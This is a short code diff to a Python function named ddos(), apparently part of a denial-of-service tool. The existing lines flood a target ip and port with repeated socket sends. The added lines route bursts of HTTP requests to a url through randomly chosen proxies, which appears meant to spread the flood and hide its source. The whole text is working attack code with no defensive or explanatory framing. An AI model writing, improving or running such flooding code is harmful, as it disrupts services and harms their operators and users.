@@ -2483,6 +2483,14 @@ def ddos():
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
             s.connect((ip,port))
+            proxy = {
+                    'http': 'http://'+str(random.choice(list(proxies))),   
+                    'https': 'http://'+str(random.choice(list(proxies))),
+            }
+            scraper.get(url, proxies=proxy)
+            scraper.get(url, proxies=proxy)
+            scraper.get(url, proxies=proxy)
+            scraper.get(url, proxies=proxy)
             s.send(data)
             s.send(data)
             s.send(data)
